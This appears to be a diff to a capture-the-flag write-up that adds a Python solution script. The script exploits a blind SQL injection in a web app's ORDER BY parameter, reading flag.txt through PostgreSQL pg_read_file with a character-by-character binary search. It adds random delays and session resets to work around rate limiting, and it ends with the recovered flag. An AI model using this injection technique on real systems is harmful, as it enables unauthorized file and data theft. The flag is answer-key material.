@@ -279,7 +279,92 @@ we use PostgreSQL’s  `pg_read_file()` to read files, use  `substr()` + `asci
 CASE WHEN (ascii(substr(trim(pg_read_file('flag.txt')),pos,1)) >= mid)
      THEN name ELSE breed END
 ```
+Solution script:
 
 ```python
+import requests, re, urllib.parse, time, random, sys
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
+BASE = "http://52.59.124.14:5021/"
+FILE = "flag.txt"
+TIMEOUT = 10
+
+def new_session():
+    s = requests.Session()
+    retry = Retry(
+        total=6,
+        backoff_factor=0.4,
+        status_forcelist=[429, 500, 502, 503, 504],
+        allowed_methods=frozenset(["GET"]),
+        raise_on_status=False,
+    )
+    adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=10)
+    s.mount("http://", adapter)
+    s.headers.update({
+        "User-Agent": "Mozilla/5.0",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "close",
+    })
+    return s
+
+s = new_session()
+
+def get_names(order_expr):
+    time.sleep(0.18 + random.random()*0.15)
+    url = (BASE + "?name=&breed=&min_age=&max_age=&page=1&order=" +
+           urllib.parse.quote(order_expr + "--\n"))
+    for attempt in range(5):
+        try:
+            r = s.get(url, timeout=TIMEOUT)
+            r.raise_for_status()
+            names = re.findall(r'<div class="dog-title">([^<]+) <span class="age">', r.text)
+            if names: 
+                return names
+            return names
+        except requests.RequestException:
+            globals()['s'] = new_session()
+            time.sleep(0.4*(attempt+1) + random.random()*0.2)
+    raise
+
+BL_NAME  = get_names("name")
+BL_BREED = get_names("breed")
+print("baseline:", BL_NAME[:2], "|", BL_BREED[:2])
+
+def is_true(case_when_expr):
+    names = get_names(case_when_expr)
+    return bool(names) and bool(BL_NAME) and names[0] == BL_NAME[0]
+
+check_end = ("CASE WHEN ((SELECT strpos(trim(pg_read_file('%s',0,8192,true)),'}'))=38) "
+             "THEN name ELSE breed END") % FILE
+START_POS = 5
+KNOWN_PREFIX = "ENO{"
+
+flag = list(KNOWN_PREFIX) if START_POS > 1 else []
+for pos in range(START_POS, 39):
+    lo, hi = 32, 126
+    while lo < hi:
+        mid = (lo + hi + 1) // 2
+        cond = (
+            "CASE WHEN ("
+            f"(SELECT ascii(substr(trim(pg_read_file('{FILE}',0,8192,true)),{pos},1)))>={mid}"
+            ") THEN name ELSE breed END"
+        )
+        try:
+            if is_true(cond):
+                lo = mid
+            else:
+                hi = mid - 1
+        except Exception as e:
+            time.sleep(1.0 + random.random()*0.5)
+            continue
+    ch = chr(lo)
+    flag.append(ch)
+    print(f"[pos={pos:02d}] {ch}  |  {''.join(flag)}")
+    if pos % 5 == 0:
+        s = new_session()
+    if ch == "}":
+        break
+
+print("\nFLAG =>", "".join(flag))# ENO{CuT3_D0GG0S_T0_F1nD_Ev3r1Wh3re_<3}
 ```
